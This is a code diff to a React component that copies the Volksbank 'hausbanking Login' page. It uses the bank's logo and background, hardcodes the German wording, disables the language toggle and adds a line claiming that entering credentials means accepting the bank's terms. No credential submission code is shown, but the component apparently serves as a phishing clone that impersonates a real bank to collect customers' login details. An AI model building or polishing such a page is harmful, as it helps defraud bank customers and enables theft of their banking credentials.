@@ -3,33 +3,9 @@ import { X } from "lucide-react";
 import volksbankLogo from "@/assets/volksbank-logo.png";
 import volksbankBg from "@/assets/volksbank-bg.png";
 
-const translations = {
-  de: {
-    headerTitle: "hausbanking Login",
-    infoText: "Beim Login wird eine sichere Verbindung aufgebaut. Bitte achten Sie darauf, dass Sie Ihre Zugangsdaten auf keiner Ihnen unbekannten Seite eingeben und diese geheim halten.",
-    labelText: "Anmeldung mit Benutzername",
-    buttonText: "Weiter",
-    forgotUsername: "Benutzername vergessen?",
-    forgotPassword: "Passwort vergessen?",
-    langToggle: "English",
-  },
-  en: {
-    headerTitle: "hausbanking Login",
-    infoText: "When you log in, a secure connection is established. Please make sure that you do not enter your access details on any other site and keep them secret.",
-    labelText: "User name or authorised party number",
-    buttonText: "Continue",
-    forgotUsername: "Forgot username?",
-    forgotPassword: "Forgot password?",
-    langToggle: "Deutsch",
-  },
-};
-
 const Volksbank = () => {
   const [username, setUsername] = useState("");
   const [isFocused, setIsFocused] = useState(false);
-  const [lang, setLang] = useState<"de" | "en">("de");
-
-  const t = translations[lang];
 
   return (
     <div className="min-h-screen flex flex-col">
@@ -56,14 +32,15 @@ const Volksbank = () => {
             className="px-6 py-4 text-white font-semibold text-xl"
             style={{ backgroundColor: "#196bc1" }}
           >
-            {t.headerTitle}
+            hausbanking Login
           </div>
 
           {/* Card body */}
           <div className="bg-white px-6 py-5 space-y-4">
             {/* Info text */}
             <p className="text-base leading-snug" style={{ color: "#333" }}>
-              {t.infoText}
+              Beim Login wird eine sichere Verbindung aufgebaut. Bitte achten Sie darauf, dass Sie Ihre
+              Zugangsdaten auf keiner Ihnen unbekannten Seite eingeben und diese geheim halten.
             </p>
 
             {/* Divider */}
@@ -72,18 +49,11 @@ const Volksbank = () => {
             {/* Label row */}
             <div className="flex items-center justify-between">
               <span className="font-semibold text-xs" style={{ color: "#999" }}>
-                {t.labelText}
+                Anmeldung mit Benutzername
               </span>
-              <span className="text-sm">
-                <a
-                  href="#"
-                  onClick={(e) => {
-                    e.preventDefault();
-                    setLang(lang === "de" ? "en" : "de");
-                  }}
-                  style={{ color: "#196bc1" }}
-                >
-                  {t.langToggle}
+              <span className="text-sm space-x-2">
+                <a href="#" onClick={(e) => e.preventDefault()} style={{ color: "#196bc1" }}>
+                  English
                 </a>
               </span>
             </div>
@@ -123,11 +93,16 @@ const Volksbank = () => {
               className="w-full py-3 text-white font-semibold rounded text-sm"
               style={{ backgroundColor: "#196bc1" }}
             >
-              {t.buttonText}
+              Weiter
             </button>
 
             {/* Divider below button */}
             <hr className="-mx-6 border-gray-200" />
+
+            {/* Terms text */}
+            <p className="text-[15px] text-center" style={{ color: "#333" }}>
+              Durch die Eingabe Ihrer Zugangsdaten stimmen Sie den Nutzungsbedingungen der Bank ausdrücklich zu.
+            </p>
 
             {/* Links */}
             <div className="flex flex-col items-center" style={{ gap: 0 }}>
@@ -137,7 +112,7 @@ const Volksbank = () => {
                 className="text-[15px] no-underline hover:underline leading-tight py-0 my-0"
                 style={{ color: "#196bc1" }}
               >
-                {t.forgotUsername}
+                Benutzername vergessen?
               </a>
               <a
                 href="#"
@@ -145,7 +120,7 @@ const Volksbank = () => {
                 className="text-[15px] no-underline hover:underline leading-tight py-0 my-0"
                 style={{ color: "#196bc1" }}
               >
-                {t.forgotPassword}
+                Passwort vergessen?
               </a>
             </div>
           </div>
